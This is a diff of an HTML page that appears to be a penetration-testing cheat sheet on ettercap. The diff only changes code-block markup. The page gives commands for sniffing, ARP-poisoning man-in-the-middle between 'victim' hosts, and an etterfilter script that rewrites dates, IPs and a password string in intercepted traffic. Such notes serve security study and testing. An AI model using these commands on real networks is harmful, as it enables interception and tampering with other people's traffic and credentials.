@@ -125,46 +125,40 @@
 
 <h3 id="basic-sniffing">Basic Sniffing</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code># ettercap -Tzq -i eth0
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ettercap -Tzq -i eth0
+</code></pre></div></div>
 
 <p>To sniff traffic between 2 hosts:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code># ettercap -i eth0 -Tq -M ARP:remote /victim_ip_A/ /victim_ip_B/
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ettercap -i eth0 -Tq -M ARP:remote /victim_ip_A/ /victim_ip_B/
+</code></pre></div></div>
 
 <p>Capture traffic on a certain port only:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code># ettercap -i eth0 -T -M arp /192.168.1.1 / /192.168.1.10-20/23
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ettercap -i eth0 -T -M arp /192.168.1.1 / /192.168.1.10-20/23
+</code></pre></div></div>
 
 <h3 id="mitm">MITM</h3>
 
 <p>Filter example:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>if (tcp.dst == 1234 &amp;&amp; search(DECODED.data,"2016-10-03")){
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (tcp.dst == 1234 &amp;&amp; search(DECODED.data,"2016-10-03")){
         msg("Match date...\n");
         replace("2016-10-03","2017-10-03");
         replace("118.186.71.134","111.222.33.444");
         replace("PASw0rD","NOPassw");
 }
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Compile the filter:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code># etterfilter -o POC.ef POC.filter
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># etterfilter -o POC.ef POC.filter
+</code></pre></div></div>
 
 <p>Launch ettercap:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code># ettercap -T -q -i eth0 -F POC.ef -M ARP
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ettercap -T -q -i eth0 -F POC.ef -M ARP
+</code></pre></div></div>
 
   
 </div>
